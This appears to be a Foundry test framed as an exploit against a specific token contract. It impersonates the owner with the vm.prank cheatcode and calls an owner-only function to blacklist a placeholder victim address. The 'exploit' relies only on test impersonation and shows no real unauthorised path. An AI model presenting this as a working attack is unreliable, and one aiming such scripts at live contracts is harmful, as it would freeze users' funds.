// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CoinToken {
    function owner() external view returns (address);
    function EnemyAddress(address account, bool value) external;
    function _isEnemy(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA54954bb4E1b35AeE6eB04130CD406340EBA9B4;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we just need to identify the owner
        address victim = address(0x1234567890123456789012345678901234567890); // Example victim address
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, get the current owner of the contract
        address owner = CoinToken(TARGET).owner();

        // Impersonate the owner
        vm.prank(owner);

        // Call EnemyAddress to set the victim as an enemy
        CoinToken(TARGET).EnemyAddress(victim, true);

        // Verify the exploit worked
        bool isEnemy = CoinToken(TARGET)._isEnemy(victim);
        require(isEnemy == true, "Victim should be marked as enemy");
        assertEq(isEnemy, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

